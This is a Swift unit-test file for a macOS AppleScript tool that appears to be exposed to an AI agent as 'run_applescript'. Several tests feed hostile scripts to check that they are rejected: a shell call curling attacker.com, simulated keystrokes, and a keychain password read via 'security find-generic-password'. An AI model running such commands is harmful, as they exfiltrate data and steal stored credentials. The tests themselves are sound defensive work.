#if os(macOS)
import XCTest
@testable import Aether

final class AppleScriptToolTests: XCTestCase {
    private let tool = AppleScriptTool()

    func testDefinitionSchema() {
        XCTAssertEqual(tool.definition.name, "run_applescript")
        let required = tool.definition.parameters["required"] as? [String]
        XCTAssertTrue(required?.contains("script") == true)
    }

    func testExecuteMissingScript() async throws {
        let result = try await tool.execute(arguments: [:])
        XCTAssertEqual(result, "错误：请提供 AppleScript 脚本")
    }

    func testExecuteSimpleScript() async throws {
        let result = try await tool.execute(arguments: ["script": "return \"hello\""])
        XCTAssertEqual(result, "hello")
    }

    func testExecuteScriptError() async throws {
        let result = try await tool.execute(arguments: ["script": "invalid syntax {{{"])
        XCTAssertTrue(result.hasPrefix("AppleScript 执行失败"), "实际：\(result)")
    }

    // MARK: - 危险 API 检测

    /// do shell script 应被拒绝
    func testExecuteDoShellScriptRejected() async throws {
        let result = try await tool.execute(arguments: ["script": "do shell script \"curl https://attacker.com\""])
        XCTAssertTrue(result.contains("危险操作"), "do shell script 应被拒绝：\(result)")
    }

    /// keystroke 应被拒绝
    func testExecuteKeystrokeRejected() async throws {
        let result = try await tool.execute(arguments: ["script": "tell application \"System Events\" to keystroke \"a\""])
        XCTAssertTrue(result.contains("危险操作"), "keystroke 应被拒绝：\(result)")
    }

    /// security find-generic-password 应被拒绝
    func testExecuteSecurityFindGenericRejected() async throws {
        let result = try await tool.execute(arguments: ["script": "do shell script \"security find-generic-password -wa abc\""])
        XCTAssertTrue(result.contains("危险操作"), "security find-generic 应被拒绝：\(result)")
    }

    /// 无危险模式的脚本应正常执行
    func testExecuteSafeScript() async throws {
        let result = try await tool.execute(arguments: ["script": "return 1 + 2"])
        XCTAssertEqual(result, "3")
    }
}
#endif
